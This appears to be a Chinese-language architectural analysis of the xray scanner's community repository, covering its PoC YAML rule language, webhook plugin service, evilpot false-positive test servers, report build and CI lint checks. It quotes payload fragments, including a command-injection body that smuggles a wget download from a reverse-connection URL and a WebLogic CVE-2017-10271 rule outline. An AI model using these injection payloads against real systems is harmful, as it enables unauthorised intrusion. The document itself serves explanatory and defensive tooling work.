## 一、PoC YAML DSL：规则引擎的完整语法与执行模型

### 1.1 文件结构（Schema）

一个 PoC/指纹文件本质是一份 YAML，顶层字段如下：

```yaml
name: poc-yaml-xxx          # 规则唯一标识，命名规范由 CI 的 filename 规则强制检查
manual: true                 # 是否需要手动/主动指定才运行（true = 不参与默认被动扫描，降低误报/风险面）
transport: http               # 传输层协议：http / tcp（指纹识别里可见 tcp 用法）
set:                          # 变量池，声明式定义一批"表达式变量"，在 rules 中可直接引用
    rand: randomInt(200000000, 210000000)
    reverse: newReverse()
rules:                        # 一组原子检测规则，key 为规则名，可被 expression 顶层字段引用
    r0:
        request: { ... }      # 描述如何发送一次 HTTP/TCP 请求
        expression: ...        # CEL 表达式，判定该 rule 是否命中，并可产出 output 变量供后续 rule 使用
expression: r0() || r1()      # 顶层组合表达式：把多个 rule 的布尔结果用 && || ! 组合成最终判定
detail:                        # 元信息：作者、参考链接、漏洞描述、指纹信息等，不影响执行逻辑
    author: xxx
    links: [...]
```

### 1.2 执行模型（推断的运行时行为）

```
┌──────────────┐
│ 加载 YAML 文件 │
└──────┬───────┘
       ▼
┌──────────────────────┐
│ 解析 set: 初始化变量池   │   newReverse() / randomInt() 等为 DSL 内置函数
└──────┬───────────────┘
       ▼
┌──────────────────────────────┐
│ 按 expression 依赖顺序，惰性调用 rule │  例如 r1() || r2()，若 r1() 为 true 短路，不再发 r2 的包
│  - 渲染 request 中的 {{var}} 模板    │
│  - 发送真实网络请求                    │
│  - 用 CEL 引擎求值 rule.expression    │
│  - 若命中，写入 output 声明的变量        │
└──────┬────────────────────────┘
       ▼
┌──────────────────────┐
│ 顶层 expression 求值    │  决定这条 PoC 最终是否算命中
└──────┬───────────────┘
       ▼
┌──────────────────────┐
│ 命中则生成 WebVuln/ServiceVuln 记录 │  → 落盘/输出/推送 webhook
└──────────────────────┘
```

### 1.3 关键语言特性逐一拆解

**(1) 模板变量注入 `{{var}}`**

```yaml
path: /securityRealm/user/admin/.../createTokenByPassword?apiUrl={{reverseUrl}}
body: ...ping_ipaddr=127.0.0.1%0awget%20-P%20/tmp/%20{{reverseURL}}
```
`set` 中定义的变量可以直接以字符串插值形式出现在 `request` 的任何字段（path/body/headers）里，运行时做字符串替换后再发包。这是规则复用性的基础——同一个 PoC 只需改一个变量，就能适配不同的 payload 场景。

**(2) CEL 表达式作为判定语言**

CEL（Common Expression Language，Google 开源，被 K8s Admission Webhook 等广泛使用）具备：
- 安全（无副作用、沙箱执行、不能访问文件系统/网络）
- 语法接近 Python/JS 表达式，学习成本低
- 可扩展自定义函数（xray 注入了 `bcontains`、`bmatches`、`bsubmatch`、`md5`、`randomInt`、`newReverse` 等领域函数）

```yaml
expression: response.body.bcontains(bytes(md5(string(rand))))
```
这行代码的语义：把响应体（`bytes`）与"随机数 rand 的字符串形式取 md5 再转字节"做包含判断——这是**报错回显型 SQL 注入**的经典验证手法：构造一个 SQL 报错语句，让数据库把 `md5(随机数)` 的值抛出到错误信息里。

**(3) 正则捕获组 + 具名分组 `bsubmatch`**

在 `fingerprints/tcp-openbsd-openssh.yml` 中，45 条正则规则识别不同发行版/设备的 SSH banner：

```yaml
set:
    re1: '"^SSH-([\\d.]+)-OpenSSH_(?P<version0>[\\w._-]+) Debian-(?P<version1>\\S*maemo\\S*)\\r?\\n"'
rules:
    r1:
        expression: re1.bmatches(response.raw)
        output:
            re1_result: re1.bsubmatch(response.raw)     # 提取具名分组为 map
            osname: '"Linux"'
            version: '"" + re1_result["version0"] + " Debian " + re1_result["version1"] + ""'
expression: r1() || r2() || ... || r45()
```

这是一个典型的**"多正则短路匹配 + 字符串拼接产出结构化字段"**模式：45 条规则用 `||` 全部平铺在顶层表达式里，任意一条命中即可，命中后从对应分组提取版本号、操作系统名、设备类型，最终写入 `detail.fingerprint.infos`。

**(4) 多步骤请求编排 + 变量传递（模拟有状态攻击链）**

```yaml
# weblogic-cve-2017-10271.yml
rules:
    echo0:
        request: {...}      # 第一步：验证性回显请求（无害，只打印数字）
        expression: response.body.bcontains(b"225773091")
    reverse0:
        request: {...{{reverseURL}}...}   # 第二步：真正触发反连的攻击请求
        expression: reverse.wait(5)
expression: reverse0() || echo0()
```
这里体现了"渐进式验证"思路：优先尝试危害最小的回显验证（`echo0`），只有在这条路走不通时才退化到需要外部反连基础设施的验证方式（`reverse0`）——**用表达式的短路特性，隐式实现了验证策略的优先级排序**，不需要额外的 if/else 控制流。

**(5) `cache: true` —— 请求去重优化**

多个 rule 如果 `request` 完全一致，声明 `cache: true` 可以让引擎复用同一次实际网络请求的响应，避免对目标发送重复请求（降低对目标的影响，也提升扫描速度）。

**(6) `manual: true` —— 主动/被动扫描的安全阀**

统计发现本仓库全部 352 个 PoC 都标记为 `manual: true`，即：**这些高危 PoC 默认不会在普通爬虫/被动代理扫描中自动触发，必须用户显式通过 `--plugins phantasm` 或指定 PoC 名称主动运行**。这是一个重要的风险控制设计——数据库操作、RCE 类验证往往有破坏性或强侵入性，不应该在"顺手爬一下"的场景里被动触发。

### 1.4 反连（Reverse/OOB）机制的实现契约

```yaml
set:
    reverse: newReverse()   # 主程序内部：向反连平台（自建 DNSLog/HTTP 服务）申请一个唯一子域名/路径
    reverseUrl: reverse.url # 取出这个反连对象的可访问 URL，用于拼进 payload
rules:
    r0:
        expression: response.status == 200 && reverse.wait(5)  # 轮询反连平台 5 秒，查询该唯一标识是否被访问过
```

`reverse` 对象对外只暴露 `.url` 属性和 `.wait(timeout)` 方法，内部实现（如何跟反连平台通信、如何做超时轮询、如何保证多个并发 PoC 之间反连标识不冲突）完全被封装隐藏，PoC 编写者不需要关心。这是**好的 DSL 设计范式：把复杂的基础设施细节封装成极简的领域对象接口**。

## 二、webhook 服务：架构与数据流

### 2.1 整体数据流

```
xray 主程序扫描到漏洞
       │  POST /webhook?token=xxx&instance=xxx
       │  { "type": "web_vuln", "data": {...原始 JSON...} }
       ▼
┌───────────────────────┐
│ Flask app.py: webhook() │  1. 校验 token
└──────────┬─────────────┘  2. 按 type 分发
           ▼
┌───────────────────────────┐
│ views/views.py:            │
│ process_web_vuln(instance,data) │  把原始 JSON 转换为强类型 dataclass（WebVuln/ServiceVuln/Statistics）
└──────────┬─────────────────┘
           ▼
┌───────────────────────────┐
│ executor/executor.py:       │
│ dispatch_web_vuln(instance, vuln) │  遍历插件注册表，线程池异步分发
└──────────┬─────────────────┘
           ▼
   ┌───────┴───────┬───────────────┐
   ▼               ▼               ▼
 Plugin A        Plugin B        Plugin C   （用户自定义：写库/推送钉钉/生成工单...）
```

### 2.2 分层结构

| 层 | 文件 | 职责 |
|---|---|---|
| Controller | `app.py` | 接收 HTTP 请求，做 token 鉴权，按 `type` 路由 |
| Service（数据转换） | `views/views.py` | 把不确定 schema 的原始 JSON，转换/清洗成强类型的 `model.vuln` 对象 |
| Service（分发） | `executor/executor.py` | 遍历插件注册表，用线程池异步调用，隔离插件间故障 |
| Repository（插件加载） | `executor/registry.py` | 基于配置文件动态 `import` 插件类并实例化，构成注册表 |
| Model | `model/vuln.py`, `model/config.py`, `model/plugin.py` | `@dataclass` 定义的强类型数据结构 |
| 扩展点 | `plugins/base.py` + `plugins/*.py` | 插件基类 + 具体插件实现 |

这个分层完全符合 `Controller → Service → Repository → Model` 的经典结构，且没有一处越级调用（`app.py` 不直接操作 model 转换细节，`executor.py` 不关心插件是怎么被加载进来的）。

### 2.3 数据模型设计的细节考量

`model/vuln.py` 里 `WebVuln` 保留了 `raw_json: dict` 字段：

```python
@dataclass
class WebVuln:
    raw_json: dict          # 原始 JSON 全量保留
    create_time: datetime
    plugin: str
    url: str
    param: Optional[WebParam]
    request: List[WebRequest]
    response: List[WebResponse]
    extra: Dict[str, Any]   # 无法归一化的字段，兜底放这里
```

这是很实用的设计：**既做结构化解析方便插件开发者使用强类型字段，又完整保留原始数据兜底**，避免因为解析逻辑覆盖不全导致数据丢失。`extra` 字段配合 `views.py` 里的黑名单过滤（`not_extra_key`）实现"已知字段结构化、未知字段兜底透传"。

### 2.4 插件加载的约定优于配置

```python
def import_class(cl):
    d = cl.rfind(".")
    class_name = cl[d + 1:len(cl)]
    m = __import__(cl[0:d], globals(), locals(), [class_name])
    return getattr(m, class_name)

def init_plugin(config: Config):
    for cls, conf in config.plugin_config.items():
        if not conf.enabled:
            continue
        if "." not in cls:
            cls = cls + ".Plugin"     # 没写类名就默认 Plugin，约定优于配置
        p = import_class("plugins." + cls)
        _plugin_registry.append(p(**conf.args))
```

配置文件里插件的 key（如 `demo`）默认映射到 `plugins/demo.py` 里的 `Plugin` 类；如果一个文件里想放多个插件类，可以写成 `demo.MyPlugin` 覆盖默认约定。这种"多数情况用约定、少数情况允许显式覆盖"的设计减少了配置样板代码。

## 三、evilpot 靶场：三个服务器的实现细节

### 3.1 evil server（普通模式，8888 端口）

初始化阶段（`init()`）预先构造一份"陷阱响应体" `CommonEvilResponse`：
- 内嵌常见错误码文案（400/401/403/404/500/501/502/503）
- 内嵌常见登录表单 HTML（诱导"发现登录框"类插件误报）
- 内嵌两种 XML 声明头（诱导 XXE 检测插件误报）
- 循环 0~999，对每个数字调用 `GenEvilContent` 预计算好 md5/sha1/base64 拼接进响应体

请求处理阶段（每次请求实时执行）：
1. 把请求原始内容（`httputil.DumpRequest`）整体附加到响应里（诱导"回显型"检测的误报，因为响应里包含了请求本身的内容）
2. 用正则识别请求中形如 `sleep(5)` / `WAITFOR DELAY '0:0:5'` 的时间盲注 payload，**真的执行对应时长的 sleep**（戳穿只看响应中是否含有关键字、而不验证实际延迟的懒惰规则）
3. 用递归下降算法（操作符优先级 + 双栈）实时计算请求中出现的四则运算表达式（如 `1+1`），把结果写入响应（戳穿基于"回显计算结果"判断成功的规则）

### 3.2 evil-hard server（困难模式，8887 端口）

在普通模式基础上叠加：
1. 用自定义分词函数 `Split`（按数字/字母边界切分，`SepFunc` 判断分隔符）把整个请求体拆成词元
2. 对每一个词元都单独计算 md5/sha1/base64 并塞进响应（`GenEvilContent`），意味着**任何你在请求里发的 payload 片段，都能在响应里找到对应的哈希值**——这是对"基于哈希碰撞判断命中"的规则的极限施压
3. 直接在响应里塞入 `/etc/passwd` 和 `win.ini` 的典型内容格式，诱导"路径穿越读文件成功"类规则误判

```go
func Split(data []byte, sep func(b byte) bool, handler func([]byte) bool) {
    visible := 0
    invisible := 0
    for i := 0; i < len(data); i++ {
        if !sep(data[i]) { continue }
        invisible = i
        if invisible == visible { visible++; continue }
        b := data[visible:invisible]
        if !handler(b) { return }
        visible = invisible + 1
    }
    if visible < len(data) { handler(data[visible:]) }
}
```
这是一个无正则依赖、性能友好的手写分词器，通过传入不同的 `sep` 判断函数即可复用（本例中 `SepFunc` 把数字 0-9、大小写字母以外的字节都当作分隔符）。

### 3.3 echo server（8889 端口）

只有 5 行核心逻辑：`io.Copy(conn, conn)`，即原样把所有收到的字节回显给客户端。这是对"基于响应内容与 payload 内容比对"类检测规则的终极测试——任何你发的东西都会原样出现在响应里，规则如果只是简单做"响应包含 payload" 的判断，在这里必然产生 100% 误报。

### 3.4 三个服务器共同验证的能力矩阵

| 服务 | 验证的规则缺陷 |
|---|---|
| evil (8888) | 是否依赖响应中出现常见错误码/表单/XML 头就直接判定漏洞 |
| evil (8888) | 是否真正验证了时间盲注的实际延迟，而非仅匹配 payload 关键字 |
| evil (8888) | 是否真正验证了表达式计算结果，而非仅匹配算式字符串 |
| evil-hard (8887) | 是否会被"响应中任意片段的哈希巧合"欺骗 |
| evil-hard (8887) | 是否会被"响应中恰好出现系统文件特征内容"欺骗 |
| echo (8889) | 是否单纯依赖"响应包含请求内容"做判断 |

## 四、report 前端：从 JSON 到单文件 HTML 的构建管线

### 4.1 数据注入协议

```html
<!-- public/index.html -->
<script>
    var webVulns = [];
    var serviceVulns = [];
    var subdomains = [];
</script>
```

xray 主程序生成报告时，在这三个全局数组变量后面追加形如：

```html
<script class='web-vulns'>webVulns.push({"create_time":..., "detail":{...}, "plugin":"...", "target":{"url":"..."}})</script>
```
的多条 `<script>` 标签（构建产物里会被保留，开发调试模式下用注释掉的示例数据模拟）。这是一种**"HTML 作为数据容器"**的朴素但可靠的方案：不需要 AJAX 请求后端接口（因为报告文件本身就要脱离服务端离线查看），直接把数据以 JS 字面量形式内嵌进静态文件。

### 4.2 前端消费数据流

```
App.vue → Home.vue (created 钩子等待 window.load 完成)
    → loadVulns(): 给每条记录打上 id（用作 a-table 的 rowKey）
    → webData / serviceData / subdomainData 分别传给三个展示组件
        → WebVulnerability.vue: a-table 渲染列表
            → onExpand(): 懒加载展开详情（首次展开才计算 expand 字段，避免一次性渲染全部详情拖慢性能）
```

`onExpand` 里的懒加载 + 缓存写回模式值得注意：

```js
onExpand (expanded, record) {
    if (record.expand) { return }     // 已经算过就不再重复计算，直接复用
    // ...构造 expand 数组...
    record.expand = expand             // 写回到 record 上做缓存
}
```

用一个"是否已计算"的哨兵字段（`record.expand` 是否存在）代替额外的 Set/Map 缓存结构，是很朴素但有效的写法。

### 4.3 构建配置：单文件产物

```js
// vue.config.js
optimization: { splitChunks: false },
plugins: [ new HTMLInlineSourceWebpackPlugin() ],
chainWebpack: config => {
  config.plugin('html').tap(args => {
    args[0].inlineSource = '.(js|css)$'
    return args
  })
}
```
三个配置项协同完成"零外部依赖"目标：
1. 禁用代码分割，保证只产出一个 JS bundle
2. `html-webpack-inline-source-plugin` 把这个 JS/CSS bundle 转成 base64 或直接内联到 HTML 的 `<script>`/`<style>` 标签里
3. `productionSourceMap: false` 避免生成额外的 sourcemap 文件

代价（README 中坦承的 trade-off）：antd 的图标默认是异步加载的模块，内联单文件方案下必须在 `src/icons.js` 手动显式引入每个用到的图标，否则会加载失败——**这是为了满足"离线单文件"这个真实约束，主动接受的额外维护成本，属于合理的权衡取舍**，而不是过度设计。

## 五、CI 门禁：PoC 质量的自动化把关

```yaml
- run: |
    wget https://github.com/chaitin/xray/releases/download/1.8.2/xray_linux_amd64.zip
    unzip xray_linux_amd64.zip
    ./xray_linux_amd64 poclint --script "./pocs/*" --filepath "./pocs/" \
        --rules filename,filepath,yamlschema,yamllint,cellint
```

`poclint` 是主程序内置的子命令（闭源实现，但从调用方式可以推断其能力边界），对每次 push/PR 做五重检查：

| 规则名 | 推测检查内容 |
|---|---|
| `filename` | 文件命名规范（如 `poc-yaml-` 前缀、kebab-case） |
| `filepath` | 文件是否放在正确目录（pocs/ vs fingerprints/） |
| `yamlschema` | 顶层字段（name/rules/expression 等）是否符合 Schema，字段类型是否正确 |
| `yamllint` | YAML 语法本身的风格检查（缩进、引号等） |
| `cellint` | CEL 表达式的语法合法性静态检查（避免提交语法错误的表达式导致运行时崩溃） |

这套门禁保证了**社区贡献的 352+ 条规则质量下限统一**，且不需要维护额外的独立校验脚本——直接复用产品自身发布的二进制能力，是"自举（dogfooding）"思想的体现。
